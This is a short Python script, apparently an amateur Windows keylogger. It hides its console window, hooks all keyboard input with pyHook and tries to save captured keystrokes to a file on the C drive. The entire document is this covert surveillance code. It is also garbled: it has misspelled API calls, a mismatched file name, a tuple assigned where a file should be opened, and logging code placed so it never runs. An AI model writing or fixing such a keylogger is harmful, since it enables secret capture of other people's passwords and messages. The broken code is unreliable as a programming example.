import win32api
import win32console
import win32gui
import pythoncom, pyHook

win = win32console.GetConsoleWindow()
win32gui.showWindow(win,0)


def onkeyboardEvent(event):

	if event.Ascii==5:

		_exit(1)

		if event.Ascii !=0 or 8: #<-----condition

			f = open('c:/output.text','r+') #<--- This creates The file on the C drive

			buffer = f.read()

			#close the file when user stops typing
			f.close


            #open a text file that the file was saved in 

			f = ('c:/output.txt','w')

			keylogs = chr(event.Ascii)
           #if the Ascii character is equal to 13 start a new line.
			if event.Ascii == 13:

				keylogs = '/n'

				buffer += keylogs 

				f.write(buffer)
				#close the text file

				f.close()

#Create a hook for the manager object

hm = pyHook.HookManager()

hm.KeyDown = onkeyboardEvent

#Set the hook
hm.Hookkeyboarf()

#wait forever

pythoncom.PumpMessages()